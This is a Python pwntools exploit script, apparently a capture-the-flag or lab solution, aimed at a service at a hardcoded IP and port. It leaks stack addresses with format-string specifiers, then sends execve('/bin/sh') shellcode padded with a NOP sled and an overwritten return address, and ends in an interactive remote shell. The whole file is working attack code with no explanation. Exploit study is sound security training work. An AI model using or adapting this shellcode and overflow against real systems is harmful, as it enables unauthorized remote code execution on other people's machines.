from pwn import *

# r = process("./Secret")
r = remote('140.113.207.240', 8836)

print(r.recvline())

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
str = (b'\x90') * 237

r.sendline("%38$p")
target_addr = r.recvline().split(b'W')[0][2:].decode()
buff_addr = int(target_addr, base=16)-0x120

print(buff_addr)
# r.sendline(shellcode + str + p64(buff_addr))


r.sendline("%4$p")
target_addr = r.recvline().split(b'W')[0][2:].decode()
buff_addr = int(target_addr, base=16)
print(buff_addr)
r.sendline(shellcode + str + p64(buff_addr))
r.interactive()
